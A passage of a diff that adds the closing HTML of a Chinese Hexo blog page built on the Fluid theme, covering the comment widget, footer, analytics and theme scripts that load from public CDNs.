+      Fluid.utils.createScript('https://lib.baomitu.com/waline/2.5.1/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline.dr0n.top/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["//unpkg.com/@waline/emojis@1.0.1/qq","//unpkg.com/@waline/emojis@1.0.1/bilibili"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022002247号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  
+    <script>
+        function page_time(){
+            var times = document.getElementsByTagName('time');
+            if (times.length === 0) { return; }
+            var posts = document.getElementsByClassName('post-content');
+            console.log(posts);
+            if (posts.length === 0) { return; }    
+            var pubTime = new Date(times[0].dateTime);  /* 文章发布时间戳 */
+            var now = Date.now()  /* 当前时间戳 */
+            var interval = parseInt(now - pubTime)
+            /* 发布时间超过指定时间（毫秒） */
+            if (interval > 3600*24*30*1500){
+                var days = parseInt(interval / 86400000)
+                posts[0].innerHTML = '<div class="note note-warning" style="font-size:0.9rem"><p>' +
+                '<div class="h6">文章时效性提示</div><p>这是一篇发布于 ' + days + ' 天前的文章，部分信息可能已发生改变，请注意甄别。' +
+                '</p></p></div>' + posts[0].innerHTML;
+            }
+        }
+        page_time();
+    </script>
+  
+  
+  
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?150aacf9a16405ad4ea9ead54ecac598";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
